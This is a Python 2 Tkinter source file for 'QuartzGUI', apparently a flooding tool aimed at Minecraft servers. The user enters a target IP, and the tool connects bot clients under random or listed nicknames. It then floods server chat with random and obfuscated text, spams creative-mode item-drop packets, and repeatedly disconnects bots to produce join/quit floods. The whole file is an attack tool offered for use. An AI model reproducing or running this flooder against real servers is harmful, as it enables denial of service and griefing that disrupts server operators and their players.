#!/usr/bin/python
# -*- coding: utf-8 -*-
from Tkinter import *
import libquartz, libicraft, os, random, string, re, threading, time, sys
global randomflood
global randomchangingflood
global flood
def togglecd(self):
        if self.c == True:
                self.buttona["text"] = "Start creative drop"
                self.c = False
        else:
                self.buttona["text"] = "Stop creative drop"
                self.c = True

prepend = ""

try:
	nicks=open("nicks.txt").readlines()
except:
	nicks = []
def joinaction(sk):
	time.sleep(0.5)
	sk.send(libicraft.minemsg("/spawn"))
	pass
def picknickname():
	if nicks != []:
		return random.choice(nicks).replace("\n", "")
        return prepend+"".join(random.choice(string.letters+string.digits) for x in range(random.randint(6-len(prepend),15-len(prepend))))
def kxa():
	time.sleep(0.01)
	if app.k == True:
		sys.exit()		
def action(sk):
	if app.k == True:
		sys.exit()	
	if sk != None:
		try:
			sk.cnt = sk.cnt - 1
		except:
			sk.cnt = 100
			sk.csk = 101
		if app.c == True:
			sk.send(libicraft.creativedrop())
		if sk.cnt == 0:
			if app.i == True:
				sk.close()
			if app.b == True:
				sk.send(libicraft.minemsg("".join(random.choice(string.letters+string.digits) for x in range(random.randint(1,100)))))
			if app.y == True:
				sk.send(libicraft.minemsg("§k"+"".join(random.choice(string.letters+string.digits) for x in range(random.randint(1,50)))))
			sk.cnt = sk.csk
			sk.csk += 1
			sk.send("\x00\x00\x00\x00\x00")
class App:

    def __init__(self, master):
         frame = Frame(master)
         frame.pack()
	 self.c=False    
         self.lbl = Label(frame, text = "QuartzGUI\n")
	 self.lbl['text'] = "QuartzGUI - IDLE"
         self.lbl.pack()
         self.lbla = Label(frame, text = "QuartzGUI\n")
	 self.lbla['text'] = "Target:"
         self.lbla.pack()
         self.entryWidget = Entry(frame, justify=CENTER, textvariable="IP")
         self.entryWidget["width"] = 22
         self.entryWidget.pack()
         self.buttona = Button(frame, text="Start Creative Drop", fg="red", command=self.cd)
         self.buttona.pack()
         self.buttonb = Button(frame, text="Start Random Flood", fg="red", command=self.rf)
         self.buttonb.pack()
         self.buttonc = Button(frame, text="Start Changing Flood", fg="red", command=self.rd)
         self.buttonc.pack()
         self.buttont = Button(frame, text="Quit Flood", fg="red", command=self.quita)
         self.buttont.pack()
         self.button = Button(frame, text="Quit", fg="red", command=self.quit)
         self.button.pack()
         self.hi_there = Button(frame, text="Connect", command=self.start)
         self.hi_there.pack()
	 self.button['width'] = 20
	 self.buttont['width'] = 20
	 self.buttonc['width'] = 20
	 self.buttonb['width'] = 20
	 self.buttona['width'] = 20
	 self.hi_there['width'] = 20
	 self.b = False
	 self.c = False
	 self.k = False
	 self.i = False
	 self.y = False
	 self.a = True
    def rf(self):
	if self.b == False:
		self.b = True
		self.buttonb["text"]="Stop Random Flood"
	else:
		self.b = False
		self.buttonb["text"]="Start Random Flood"
    def rd(self):
	if self.y == False:
		self.y = True
		self.buttonc["text"]="Stop Changing Flood"
	else:
		self.y = False
		self.buttonc["text"]="Start Changing Flood"
    def quita(self):
	if self.i == False:
		self.i = True
		self.buttont["text"]="Stop Quit Flood"
	else:
		self.i = False
		self.buttont["text"]="Quit Flood"
    def cd(self):
	togglecd(self)
    def quit(self):
	os.kill(os.getpid(), 9)
    def start(self):
	if self.hi_there['text'] == "Connect":
		self.hi_there['text'] = "Disconnect"
		self.lbl['text'] = "QuartzGUI - Running!"
		self.k = False
		libquartz.start(picknickname, action, joinaction, self.entryWidget.get(), kxa)
	else:
		self.hi_there['text'] = "Connect"
		self.lbl['text'] = "QuartzGUI - IDLE"
		self.k = True
root = Tk()
root.geometry("216x256")
root.resizable(0,0)
flood=False
randomchangingflood=False
randomflood=False
root.title("QuartzGUI")
app = App(root)
root.mainloop()
